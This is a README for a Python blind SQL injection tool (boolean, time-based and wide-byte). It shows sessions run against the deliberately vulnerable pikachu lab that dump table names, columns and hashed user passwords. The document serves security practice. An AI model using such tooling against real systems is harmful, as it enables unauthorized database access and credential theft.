# sqli_blind
A simple tool/framework for boolean-based or time-based sql injection(blind) 

**sqli_blind是一款用于基于布尔的SQL盲注和基于时间的SQL盲注的简单工具/框架**

# 简介

sql_blind是为了方便SQL盲注而开发的小工具/框架，目前支持基于布尔的SQL盲注（包括宽字节注入）和基于时间的SQL盲注。
其主要目的是辅助手工注入，缩短手工注入的时间。
使用者需要根据实际情况修改payload和部分参数。
小工具（的示例）基于pikachu漏洞平台SQL-Inject的两个盲注关卡以及宽字节注入关卡开发，如有必要可以用这3个关卡进行测试。

# 项目地址

https://github.com/JacquelinXiang/sqli_blind/tree/main

# 环境要求

本工具基于python3，使用前请先确保安装了python3

# 使用方法

1 下载源代码，根据实际情况修改sqli_bb.py，sqli_tb.py和sqli_bb_widebyte.py的payload和部分参数

2 命令行进入源代码所在文件夹（比如sqli_blind）上级文件夹
输入
python
\>\>\> from sqli_blind import *
然后调用各函数即可

# 示例

## 布尔盲注

```
以pikachu漏洞平台SQL-Inject的布尔盲注关卡为例：

>>> from sqli_blind import *
>>> CurrentDatabaseBool()
the name of current database contains 7 characters
the name of current database is PIKACHU
>>> TablesBool()
the name of all tables in current database contains 38 characters
the name of all tables in current database is HTTPINFO,MEMBER,MESSAGE,USERS,XSSBLIND
>>> ColumnsBool()
the name of all columns in current table contains 164 characters
the name of all columns in current table is USER_ID,FIRST_NAME,LAST_NAME,USER,PASSWORD,AVATAR,LAST_LOGIN,FAILED_LOGIN,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,ID,USERNAME,PASSWORD,LEVEL,ID,USERNAME,PASSWORD
>>> ContentBool()
the content contains 117 characters
the content is ADMIN^E10ADC3949BA59ABBE56E057F20F883E,PIKACHU^670B14728AD9902AECBA32E22FA4F6BD,TEST^E99A18C428CB38D5F260853678922E03
```



## 时间盲注

```
以pikachu漏洞平台SQL-Inject的时间盲注关卡为例：

>>> from sqli_blind import *
>>> CurrentDatabaseTime()
the name of current database contains 7 characters
the name of current database is PIKACHU
>>> TablesTime()
the name of all tables in current database contains 38 characters
the name of all tables in current database is HTTPINFO,MEMBER,MESSAGE,USERS,XSSBLIND
>>> ColumnsTime()
the name of all columns in current table contains 164 characters
the name of all columns in current table is USER_ID,FIRST_NAME,LAST_NAME,USER,PASSWORD,AVATAR,LAST_LOG!N,FAILED_LOGIN,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,ID,USERNAME,PASSWORD,LEVEL,ID,USERNAME,PASSWORD
>>> ContentTime()
the content contains 117 characters
the content is ADMIN^E10ADC3949BA59ABBE56E057F20F883E,PIKACHU^670B14728AD9902AECBA32E22FA4F6BD,TEST^E99A18C428CB38D5F260853678922E03
```



## 布尔盲注+宽字节注入

```
以pikachu漏洞平台SQL-Inject的宽字节注入关卡为例：

>>> from sqli_blind import *
>>> CurrentDatabaseWide()
the name of current database contains 7 characters
the name of current database is pikachu
>>> TablesWide()
the name of all tables in current database contains 38 characters
the name of all tables in current database is httpinfo,member,message,users,xssblind
>>> ColumnsWide()
the name of all columns in current table contains 164 characters
the name of all columns in current table is user_id,first_name,last_name,user,password,avatar,last_login,failed_login,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level,id,username,password
>>> ContentWide()
the content contains 117 characters
the content is admin~e10adc3949ba59abbe56e057f20f883e,pikachu~670b14728ad9902aecba32e22fa4f6bd,test~e99a18c428cb38d5f260853678922e03
```

